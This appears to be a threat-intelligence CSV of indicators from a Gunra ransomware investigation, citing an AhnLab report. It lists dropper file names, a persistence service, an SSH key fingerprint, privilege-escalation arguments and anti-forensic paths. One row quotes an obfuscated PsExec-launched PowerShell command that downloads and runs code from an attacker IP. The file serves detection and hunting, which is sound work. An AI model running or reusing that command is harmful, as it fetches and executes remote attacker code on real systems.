value,type,artifact_type,observed_at,campaign_refs,malware_refs,infrastructure_refs,roles,context
net.tmp,,file-name,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,dropper-type-trace|shared-file-pattern,"AhnLab PDF p.49 and p.53: logs in the Gunra case showed net.tmp creation; the relevant file was not collected, so this is a hunting artifact rather than a sample identity."
_net.tmp,,file-name,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,dropper-type-trace|shared-file-pattern,"AhnLab PDF p.53: logs in the Gunra case showed _net.tmp creation; the relevant file was not collected."
inet.tmp,,file-name,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,privilege-escalation-trace|shared-file-pattern,"AhnLab PDF p.49 and p.53 identifies inet.tmp as a privilege-escalation tool name in the Gunra case."
uploadmgr,,service-name,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,persistence-service|shared-service-pattern,"AhnLab PDF p.49 and p.53: loader malware was registered as uploadmgr; the report says this name is used frequently although service names can be random."
Qr1to32lQHxEu6phzNyrTZrU0iElrOfVWMBLnqoen24,,sample-string,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,ssh-key-fingerprint|shared-credential,"AhnLab PDF p.54: the same SHA-256 SSH public-key fingerprint was present in the unnamed-cluster watering-hole case and the Gunra case."
administrators_authorized_keys,,file-name,,activity--operation-double-barrel-technical-overlap-2026,,,ssh-authorized-key-file|unnamed-cluster-context,"AhnLab PDF p.54 names the authorized-key file in the unnamed-cluster side; only the key fingerprint, not this filename, is explicitly confirmed in Gunra logs."
monitoring-account,,other,,activity--operation-double-barrel-technical-overlap-2026,,,ssh-account|unnamed-cluster-context,"AhnLab PDF p.54 Figure 35 shows this comment/account string in the attacker public-key file; it is retained as source-scoped context, not as a Gunra identity."
x9nsB3iYUWiDT6BZKO5pgtMW,,sample-string,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,privilege-escalation-argument|shared-argument,"AhnLab PDF p.53 states Gunra inet.tmp used this exact argument, identical to a UACMe-based privilege-escalation tool argument in a prior unnamed-cluster case."
XUZH74-H4T5PL-523C3L-IAIN76-39I47407,,sample-string,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,dropper-argument|gunra-case,"AhnLab PDF p.53-54 Table 9 shows this GUID-formatted net.tmp argument in the Gunra column."
hotfix.exe,,file-name,,activity--operation-double-barrel-technical-overlap-2026,,,renamed-psexec|remote-execution,"AhnLab PDF p.55 states hotfix.exe was actually PsExec; no individual execution date is provided."
"hotfix.exe -accepteula powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http:'+[char]47+[char]47+'176.65.128[.]26:443')",,command,,activity--operation-double-barrel-technical-overlap-2026,,,psexec|powershell|payload-download,"AhnLab PDF p.55 reproduces this Gunra command and says the obfuscated slash pattern was used in multiple Gunra attack cases."
C:\ProgramData\inet.tmp,,file-path,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,anti-forensic-source-path,"AhnLab PDF p.56 Table 10 lists this Gunra path before random-four-character rename and deletion."
C:\ProgramData\net.tmp,,file-path,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,anti-forensic-source-path,"AhnLab PDF p.56 Table 10 lists this Gunra path before random-four-character rename and deletion."
C:\ProgramData\uwwz,,file-path,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,anti-forensic-renamed-path,"AhnLab PDF p.56 Table 10: inet.tmp was renamed to uwwz before deletion in the Gunra case."
C:\ProgramData\dpke,,file-path,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,anti-forensic-renamed-path,"AhnLab PDF p.56 Table 10: net.tmp was renamed to dpke before deletion in a Gunra case."
C:\ProgramData\lvlu,,file-path,2026-03,activity--gunra-operation-double-barrel-incident-2026-03|activity--operation-double-barrel-technical-overlap-2026,,,anti-forensic-renamed-path,"AhnLab PDF p.56 Table 10: net.tmp was renamed to lvlu before deletion in a Gunra case."
